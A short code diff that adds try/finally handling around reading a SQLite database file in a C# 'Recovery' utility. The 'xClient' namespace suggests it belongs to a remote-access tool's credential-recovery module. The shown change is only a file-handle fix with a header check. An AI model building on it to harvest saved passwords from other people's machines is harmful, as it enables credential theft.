@@ -21,10 +21,19 @@ namespace xClient.Core.Recovery.Utilities
         {
             if (File.Exists(baseName))
             {
-                FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
-                string str = Strings.Space((int)FileSystem.LOF(1));
-                FileSystem.FileGet(1, ref str, -1L, false);
-                FileSystem.FileClose(new int[] { 1 });
+                string str = string.Empty;
+
+                try
+                {
+                    FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
+                    str = Strings.Space((int)FileSystem.LOF(1));
+                    FileSystem.FileGet(1, ref str, -1L, false);
+                }
+                finally
+                {
+                    FileSystem.FileClose(new int[] { 1 });
+                }
+
                 this.db_bytes = Encoding.Default.GetBytes(str);
                 if (Encoding.Default.GetString(this.db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
                 {
